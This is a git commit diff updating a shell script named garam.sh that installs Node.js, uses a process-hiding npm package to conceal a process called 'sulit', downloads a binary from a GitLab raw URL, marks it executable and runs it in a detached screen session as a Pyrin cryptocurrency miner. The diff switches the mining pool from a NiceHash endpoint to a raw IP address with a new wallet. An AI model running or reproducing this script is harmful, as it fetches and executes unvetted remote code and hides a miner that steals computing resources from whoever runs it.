944c8f58df29e2411d4be5a1e200615fcc30daa5
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-18 00:56:47 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -7,8 +7,7 @@ curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
 sudo apt install npm =y
 sudo npm i -g node-process-hider && sudo ph add sulit
-wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
 wget -qO sulit https://gitlab.com/sarifadim/jomblo/-/raw/main/lolipop && chmod +x *
-screen -dms run ./sulit --url=3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 01-$(TZ=UTC-7 date +"%H-%M-%S"))@pyrinhash.auto.nicehash.com:9200 --log --extra --pers=PYI
+screen -dms run ./sulit --url=pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))@47.237.21.190:443 --log --extra --pers=PYI
 EOF
 screen -r
